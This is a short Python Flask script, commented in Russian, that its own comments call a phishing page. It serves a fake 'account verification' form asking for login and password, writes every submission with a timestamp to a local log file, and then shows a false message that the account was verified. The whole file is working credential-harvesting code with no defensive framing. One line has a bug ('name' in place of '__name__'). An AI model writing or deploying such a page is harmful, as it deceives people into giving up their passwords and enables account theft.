from flask import Flask, request, render_template_string, redirect, url_for
import datetime

app = Flask(__name__)

# Функция для записи данных в файл
def log_to_file(username, password):
    with open("logs.txt", "a", encoding="utf-8") as file:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        file.write(f"{timestamp} - Попытка входа: {username} / {password}\n")

# Главная страница (фишинговая форма)
@app.route('/', methods=['GET', 'POST'])
def phishing_page():
    if request.method == 'POST':
        # Получаем введенные данные
        username = request.form.get('username')
        password = request.form.get('password')

        # Логируем данные в файл
        log_to_file(username, password)

        # Перенаправляем на страницу "успеха"
        return redirect(url_for('success_page'))
    
    # HTML-код фишинговой страницы
    html_form = '''
    <h1>Проверка учетной записи</h1>
    <p>Пожалуйста, введите свои данные для подтверждения:</p>
    <form method="POST">
        <label for="username">Логин:</label><br>
        <input type="text" id="username" name="username" required><br><br>
        <label for="password">Пароль:</label><br>
        <input type="password" id="password" name="password" required><br><br>
        <button type="submit">Подтвердить</button>
    </form>
    '''
    return render_template_string(html_form)

# Страница "успеха" (после ввода данных)
@app.route('/success')
def success_page():
    return '''
    <h1>Спасибо!</h1>
    <p>Ваши данные успешно проверены. Доступ к учетной записи сохранен.</p>
    '''

if name == '__main__':
    app.run(debug=True)
